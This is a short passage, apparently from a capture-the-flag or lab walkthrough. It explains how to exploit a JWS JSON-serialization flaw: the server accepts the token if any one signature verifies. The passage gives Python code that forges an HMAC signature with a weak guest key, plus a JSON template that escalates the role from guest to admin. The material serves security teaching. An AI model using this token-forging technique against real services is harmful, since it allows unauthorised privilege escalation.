## Node 04: The Hydra (JSON Serialization Flaw)
The server accepts an array of signatures and stops checking as soon as it finds one that matches.

1. Obtain the Token: This token will be a JSON object containing a Base64URL encoded `payload` and an array of `signatures`.
2. Elevate Payload: Decode the payload string, change `"role": "guest"` to `"role": "admin"`, and Base64URL encode it back.
   - Important: Do not add padding (=).
3. Generate a Rogue Signature: We know the guest secret is guest (assume from analyzing system behavior or previous recons). You need to generate a valid signature for your new payload using the weak guest key.
4. You can use Python to generate this:
```python
import hmac, hashlib, base64
hdr = base64.urlsafe_b64encode(b'{"alg":"HS256"}').decode().rstrip("=")
pyl = "YOUR_NEW_B64_PAYLOAD_HERE"
sig = base64.urlsafe_b64encode(hmac.new(b"guest", f"{hdr}.{pyl}".encode(), hashlib.sha256).digest()).decode().rstrip("=")
print(f"Protected: {hdr}\nSignature: {sig}")
```
4. Append the Signature: Modify the JSON. Keep the original (now invalid) admin signature block, but append your new, valid guest signature block to the array.
```json
{
  "payload": "YOUR_NEW_B64_PAYLOAD",
  "signatures": [
    {
      "protected": "ORIGINAL_HEADER",
      "signature": "ORIGINAL_SIGNATURE"
    },
    {
      "protected": "YOUR_NEW_HEADER",
      "signature": "YOUR_NEW_SIGNATURE"
    }
  ]
}
```
5. Submit: Send the entire JSON payload to the server.